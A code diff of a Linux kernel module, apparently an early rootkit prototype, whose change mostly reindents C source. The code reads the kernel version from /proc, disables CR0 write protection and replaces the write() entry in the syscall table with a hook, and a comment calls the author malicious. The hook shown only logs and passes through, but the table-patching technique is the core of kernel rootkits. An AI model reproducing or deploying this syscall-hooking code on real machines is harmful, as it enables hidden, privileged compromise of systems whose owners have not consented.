@@ -4,13 +4,9 @@
 #include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
 #include <linux/fs.h>      /* filp_open */
 #include <linux/slab.h>    /* kmalloc */
-//#include <linux/preempt.h> /* preempt_enable, preempt_disable */
-#include <linux/interrupt.h> /* disable_irq, enable_irq */
 
 #include <asm/paravirt.h> /* write_cr0 */
 #include <asm/uaccess.h>  /* get_fs, set_fs */
-#include <asm/syscall.h>  /* sys_call_ptr_t */
-//#include <asm/page.h>     /* virt_to_page */
 
 #include "hooks.h"
 
@@ -141,105 +137,105 @@ static int find_sys_call_table (char *kern_ver) {
  * stack frame is removed.
  */
 char *acquire_kernel_version (char *buf) {
-  struct file *proc_version;
-  char *kernel_version;
-
-  /*
-   * We use this to store the userspace perspective of the filesystem
-   * so we can switch back to it after we are done reading the file
-   * into kernel memory
-   */
-  mm_segment_t oldfs;
-
-  /*
-   * Standard trick for reading a file into kernel space
-   * This is very bad practice. We're only doing it here because
-   * we're malicious and don't give a damn about best practices.
-   */
-  oldfs = get_fs();
-  set_fs (KERNEL_DS);
-
-  /*
-   * Open the version file in the /proc virtual filesystem
-   */
-  proc_version = filp_open(PROC_V, O_RDONLY, 0);
-  if (IS_ERR(proc_version) || (proc_version == NULL)) {
-    return NULL;
-  }
-
-  /*
-   * Zero out memory just to be safe
-   */
-  memset(buf, 0, MAX_VERSION_LEN);
-
-  /*
-   * Read version info from /proc virtual filesystem
-   */
-  vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));
-
-  /*
-   * Extract the third field from the full version string
-   */
-  kernel_version = strsep(&buf, " ");
-  kernel_version = strsep(&buf, " ");
-  kernel_version = strsep(&buf, " ");
-
-  filp_close(proc_version, 0);
+    struct file *proc_version;
+    char *kernel_version;
   
-  /*
-   * Switch filesystem context back to user space mode
-   */
-  set_fs(oldfs);
-
-  return kernel_version;
+    /*
+     * We use this to store the userspace perspective of the filesystem
+     * so we can switch back to it after we are done reading the file
+     * into kernel memory
+     */
+    mm_segment_t oldfs;
+  
+    /*
+     * Standard trick for reading a file into kernel space
+     * This is very bad practice. We're only doing it here because
+     * we're malicious and don't give a damn about best practices.
+     */
+    oldfs = get_fs();
+    set_fs (KERNEL_DS);
+  
+    /*
+     * Open the version file in the /proc virtual filesystem
+     */
+    proc_version = filp_open(PROC_V, O_RDONLY, 0);
+    if (IS_ERR(proc_version) || (proc_version == NULL)) {
+        return NULL;
+    }
+  
+    /*
+     * Zero out memory just to be safe
+     */
+    memset(buf, 0, MAX_VERSION_LEN);
+  
+    /*
+     * Read version info from /proc virtual filesystem
+     */
+    vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));
+  
+    /*
+     * Extract the third field from the full version string
+     */
+    kernel_version = strsep(&buf, " ");
+    kernel_version = strsep(&buf, " ");
+    kernel_version = strsep(&buf, " ");
+  
+    filp_close(proc_version, 0);
+    
+    /*
+     * Switch filesystem context back to user space mode
+     */
+    set_fs(oldfs);
+  
+    return kernel_version;
 }
 
 asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
-  printk(KERN_EMERG "[+] write() hooked.");
-
-  return original_write(x, y, size);
+    printk(KERN_EMERG "[+] write() hooked.");
+  
+    return original_write(x, y, size);
 }
 
 static int __init onload(void) {
-  char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
-  printk(KERN_WARNING "Hello world!\n");
- // printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));
-
-  find_sys_call_table(acquire_kernel_version(kernel_version));
-
-  printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
-  printk(KERN_EMERG "sizeof(unsigned long *): %zx\n", sizeof(unsigned long*));
-  printk(KERN_EMERG "sizeof(sys_call_table) : %zx\n", sizeof(syscall_table));
-
-  if (syscall_table != NULL) {
-    write_cr0 (read_cr0 () & (~ 0x10000));
-    original_write = (void *)syscall_table[__NR_write];
-    syscall_table[__NR_write] = &new_write;
-    write_cr0 (read_cr0 () | 0x10000);
-    printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
-  } else {
-    printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
-  }
-
-  kfree(kernel_version);
-
-  /*
-   * A non 0 return means init_module failed; module can't be loaded.
-   */
-  return 0;
+    char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
+    printk(KERN_WARNING "Hello world!\n");
+    // printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));
+  
+    find_sys_call_table(acquire_kernel_version(kernel_version));
+  
+    printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
+    printk(KERN_EMERG "sizeof(unsigned long *): %zx\n", sizeof(unsigned long*));
+    printk(KERN_EMERG "sizeof(sys_call_table) : %zx\n", sizeof(syscall_table));
+  
+    if (syscall_table != NULL) {
+        write_cr0 (read_cr0 () & (~ 0x10000));
+        original_write = (void *)syscall_table[__NR_write];
+        syscall_table[__NR_write] = &new_write;
+        write_cr0 (read_cr0 () | 0x10000);
+        printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
+    } else {
+        printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
+    }
+  
+    kfree(kernel_version);
+  
+    /*
+     * A non 0 return means init_module failed; module can't be loaded.
+     */
+    return 0;
 }
 
 static void __exit onunload(void) {
-  if (syscall_table != NULL) {
-    write_cr0 (read_cr0 () & (~ 0x10000));
-    syscall_table[__NR_write] = original_write;
-    write_cr0 (read_cr0 () | 0x10000);
-    printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
-  } else {
-    printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
-  }
+    if (syscall_table != NULL) {
+        write_cr0 (read_cr0 () & (~ 0x10000));
+        syscall_table[__NR_write] = original_write;
+        write_cr0 (read_cr0 () | 0x10000);
+        printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
+    } else {
+        printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
+    }
 
-  printk(KERN_INFO "Goodbye world!\n");
+    printk(KERN_INFO "Goodbye world!\n");
 }
 
 module_init(onload);
